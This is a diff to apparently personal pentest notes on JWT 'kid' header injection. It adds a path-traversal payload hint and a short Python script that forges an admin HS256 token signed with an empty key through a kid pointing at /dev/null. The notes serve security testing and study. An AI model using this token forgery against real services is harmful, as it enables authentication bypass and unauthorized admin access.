@@ -85,10 +85,28 @@ If this parameter is also vulnerable to `directory traversal`, an attacker could
 ```bash
 {
     "kid": "../../path/to/file",
+
+# Don't forger to try basic path traversal / File inclusion payload here like ....//....//....//....//, etc etc
 ```
 This is especially dangerous if the server also supports JWTs signed using a [symmetric algorithm](https://portswigger.net/web-security/jwt/algorithm-confusion#symmetric-vs-asymmetric-algorithms). In this case, an attacker could potentially point the kid parameter to a predictable, static file, then sign the JWT using a secret that matches the contents of this file.
 
 You could theoretically do this with any file, but one of the simplest methods is to use `/dev/null`, which is present on most Linux systems. As this is an empty file, reading it returns an empty string. Therefore, signing the token with a empty string will result in a valid signature.
+
+Here is a python script that would forge a JWT with an `empty signature` in case we've found a way to path traverse and use the `/dev/null` file : 
+```python
+python3 -c "
+import hmac, hashlib, base64
+
+header = 'eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLi4vLy4uLi4vLy4uLi4vLy4uLi4vL2Rldi9udWxsIiwidHlwIjoiSldUIn0'
+payload = 'eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE3NzgxNDI1MjV9'
+message = f'{header}.{payload}'
+
+signature = hmac.new(b'', message.encode(), hashlib.sha256).digest()
+signature_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')
+
+print(f'\nVotre JWT forgé :\n{message}.{signature_b64}\n')
+"
+```
 
 By default on every header, we should try : 
 - `SQL` injection payload, because sometimes the header is making a request to a database
